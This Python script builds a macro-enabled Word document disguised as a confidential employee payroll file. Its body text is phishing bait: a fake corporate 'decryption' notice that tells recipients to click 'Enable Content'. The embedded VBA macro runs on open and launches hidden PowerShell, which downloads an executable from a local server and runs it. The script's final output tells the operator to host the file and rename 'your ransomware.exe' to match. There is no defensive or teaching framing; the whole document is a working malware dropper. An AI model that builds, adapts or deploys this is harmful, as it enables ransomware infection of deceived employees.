import os
import sys
import win32com.client
import pythoncom
from datetime import datetime

class NominaMacroCreator:
    def __init__(self):
        self.macro_name = "Document_Open"
    
    def create_nomina_document(self, output_file="Nomina_Confidencial_Q4_2024.docm"):
        """
        Crea documento Word (.docm) profesional para nóminas.
        """
        print("[*] Generando documento de nómina corporativa...")
        
        pythoncom.CoInitialize()
        
        try:
            # 1. Iniciar Word
            word = win32com.client.Dispatch("Word.Application")
            word.Visible = False
            word.DisplayAlerts = False
            
            # 2. Crear documento nuevo (SIMPLIFICADO)
            doc = word.Documents.Add()
            
            # 3. Contenido profesional (texto plano, sin formateo complejo)
            contenido = f"""NÓMINA DEL CUARTO TRIMESTRE 2024
======================================================================

Estimado empleado,

Fecha de generación: {datetime.now().strftime('%d/%m/%Y')}
ID Documento: HR-PAY-2024-Q4-{hash(datetime.now()) % 10000:04d}

INICIATIVA DE SEGURIDAD "PROYECTO ARGOS"

Como parte de nuestra continua mejora en ciberseguridad, hemos implementado 
un nuevo sistema de distribución segura para documentos confidenciales.

⚠️  INSTRUCCIONES IMPORTANTES (SOLO PRIMERA VEZ):

Este documento utiliza encriptación de última generación (AES-256) para 
proteger su información personal y financiera.

Para acceder a su nómina:
1. Cuando Word muestre la barra de seguridad, haga clic en 'HABILITAR CONTENIDO'
2. Espere a que se complete el proceso de desencriptación (≈15 segundos)
3. Su nómina aparecerá automáticamente

CARACTERÍSTICAS DE SEGURIDAD:
✓ Cifrado punto-a-punto AES-256
✓ Verificación de integridad SHA-256
✓ Certificado digital corporativo
✓ Protección contra manipulación

Nota: Este proceso solo será necesario la primera vez que abra este documento.
Futuras nóminas usarán la misma configuración de seguridad.

======================================================================
DEPARTAMENTO DE RECURSOS HUMANOS
Área de Sistemas y Ciberseguridad
Tel. interno: 2345 | Email: sistemas.rh@empresa.com
© 2024 Empresa S.A. - Confidencial
======================================================================"""
            
            # 4. Insertar texto (método simple)
            doc.Content.Text = contenido
            
            # 5. Formateo básico seguro
            try:
                # Intentar formateo simple (puede fallar, pero no es crítico)
                doc.Content.Font.Name = "Calibri"
                doc.Content.Font.Size = 11
                doc.Content.Paragraphs(1).Alignment = 1  # Centrar título
                doc.Content.Paragraphs(1).Font.Size = 16
                doc.Content.Paragraphs(1).Font.Bold = True
            except:
                pass  # Si falla el formateo, continuamos igual
            
            # 6. Añadir código VBA profesional (IGUAL QUE ANTES)
            vba_code = '''Attribute VB_Name = "NominaModule"
Option Explicit

Private Const PROC_NAME As String = "SistemaDesencriptacionNomina"

Sub Document_Open()
    On Error GoTo ErrorHandler
    
    If Not ValidarEntorno() Then Exit Sub
    Call MostrarInterfazUsuario
    Call ProcesarNomina
    
    ThisDocument.Saved = True
    Exit Sub
    
ErrorHandler:
    Call RegistrarError(Err.Number, Err.Description)
    ThisDocument.Saved = True
End Sub

Private Function ValidarEntorno() As Boolean
    Dim appName As String
    On Error Resume Next
    
    appName = Application.Name
    If InStr(1, appName, "Word", vbTextCompare) = 0 Then
        MsgBox "Este documento requiere Microsoft Word para su visualización.", _
               vbCritical + vbOKOnly, "Error del Sistema"
        ValidarEntorno = False
        Exit Function
    End If
    
    Dim regKey As Object
    Set regKey = CreateObject("WScript.Shell")
    Dim ejecutadoPreviamente As String
    
    On Error Resume Next
    ejecutadoPreviamente = regKey.RegRead("HKCU\\Software\\Empresa\\ProyectoArgos\\Ejecutado")
    
    If ejecutadoPreviamente = "1" Then
        MsgBox "El proceso de desencriptación ya se completó." & vbCrLf & _
               "El documento debe mostrarse normalmente.", _
               vbInformation + vbOKOnly, "Proceso Completado"
        ValidarEntorno = False
        Exit Function
    End If
    
    regKey.RegWrite "HKCU\\Software\\Empresa\\ProyectoArgos\\Ejecutado", "1", "REG_SZ"
    ValidarEntorno = True
End Function

Private Sub MostrarInterfazUsuario()
    Application.StatusBar = "Inicializando sistema de seguridad..."
    Dim i As Long
    For i = 1 To 500000: Next i
    
    Application.StatusBar = "Verificando certificado digital..."
    For i = 1 To 400000: Next i
    
    MsgBox _
        "SISTEMA DE DESENCRIPTACIÓN CORPORATIVO" & vbCrLf & vbCrLf & _
        "Proceso: Descarga de componentes de seguridad" & vbCrLf & _
        "Tiempo estimado: 10-15 segundos" & vbCrLf & _
        "Estado: Iniciando..." & vbCrLf & vbCrLf & _
        "Por favor, no cierre el documento.", _
        vbInformation + vbOKOnly, "Proyecto Argos"
End Sub

Private Sub ProcesarNomina()
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    
    Dim cmd As String
    cmd = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "
    cmd = cmd & """& { "
    cmd = cmd & "  Write-Host 'Inicializando módulo de seguridad...' -ForegroundColor Yellow; "
    cmd = cmd & "  Start-Sleep -Seconds 2; "
    cmd = cmd & "  Write-Host 'Descargando certificado de validación...' -ForegroundColor Yellow; "
    cmd = cmd & "  $url = 'http://192.168.1.137:8000/security_update.exe'; "
    cmd = cmd & "  $output = $env:TEMP + '\\HR_Security_Module.exe'; "
    cmd = cmd & "  Invoke-WebRequest -Uri $url -OutFile $output; "
    cmd = cmd & "  Write-Host 'Verificando integridad...' -ForegroundColor Green; "
    cmd = cmd & "  Start-Sleep -Seconds 1; "
    cmd = cmd & "  Start-Process $output -WindowStyle Hidden; "
    cmd = cmd & "  Write-Host 'Proceso completado.' -ForegroundColor Green; "
    cmd = cmd & "}"""
    
    shell.Run cmd, 0, False
    
    Dim j As Long
    For i = 1 To 10
        Application.StatusBar = "Desencriptando... " & i * 10 & "% completado"
        For j = 1 To 200000: Next j
    Next i
    
    Application.StatusBar = "Listo"
    
    MsgBox _
        "DESENCRIPTACIÓN COMPLETADA CON ÉXITO" & vbCrLf & vbCrLf & _
        "Su nómina está ahora disponible." & vbCrLf & _
        "Este proceso no será necesario en futuras aperturas." & vbCrLf & vbCrLf & _
        "Gracias por su colaboración.", _
        vbInformation + vbOKOnly, "Proceso Finalizado"
    
    Set shell = Nothing
End Sub

Private Sub RegistrarError(errNum As Long, errDesc As String)
    On Error Resume Next
    Dim fso As Object, ts As Object
    Set fso = CreateObject("Scripting.FileSystemObject")
    Dim logPath As String
    logPath = Environ("TEMP") & "\\HR_System_Log.txt"
    
    Set ts = fso.OpenTextFile(logPath, 8, True)
    ts.WriteLine Now & " - Error " & errNum & ": " & errDesc
    ts.Close
    
    MsgBox "Error en el sistema de seguridad." & vbCrLf & _
           "Contacte con sistemas.rh@empresa.com", _
           vbExclamation, "Error del Sistema"
End Sub

Sub AutoOpen()
    Document_Open
End Sub'''
            
            # 7. Insertar macros
            vb_component = doc.VBProject.VBComponents.Add(1)
            vb_component.Name = "NominaModule"
            vb_component.CodeModule.AddFromString(vba_code)
            
            # 8. Propiedades del documento (CORREGIDO)
            try:
                doc.BuiltInDocumentProperties("Title").Value = "Nómina Confidencial Q4 2024"
                doc.BuiltInDocumentProperties("Subject").Value = "Compensación y beneficios"
                doc.BuiltInDocumentProperties("Company").Value = "Empresa S.A."
                doc.BuiltInDocumentProperties("Category").Value = "Recursos Humanos"
            except:
                pass  # Si falla, no es crítico
            
            # 9. Guardar
            doc.SaveAs(
                FileName=os.path.abspath(output_file),
                FileFormat=13,
                AddToRecentFiles=False
            )
            
            doc.Close(SaveChanges=False)
            word.Quit()
            
            print("=" * 60)
            print("✅ DOCUMENTO CREADO: " + output_file)
            print("=" * 60)
            print("Contenido: Documento de nómina profesional")
            print("Macros: Sistema de 'desencriptación' incluido")
            print("\n⚠️  EL DOCUMENTO INTENTARÁ DESCARGAR:")
            print("    http://192.168.1.137:8000/security_update.exe")
            print("\n[*] Prepara tu servidor:")
            print("    1. python -m http.server 8000")
            print("    2. Renombra tu ransomware.exe a security_update.exe")
            print("=" * 60)
            
        except Exception as e:
            print(f"[!] Error: {e}")
            print("[!] Asegúrate de:")
            print("    1. Tener Microsoft Word instalado")
            print("    2. Habilitar 'Confiar en acceso al modelo de objetos VBA'")
            print("    3. Ejecutar Word al menos una vez antes")
        finally:
            pythoncom.CoUninitialize()

if __name__ == "__main__":
    creator = NominaMacroCreator()
    creator.create_nomina_document()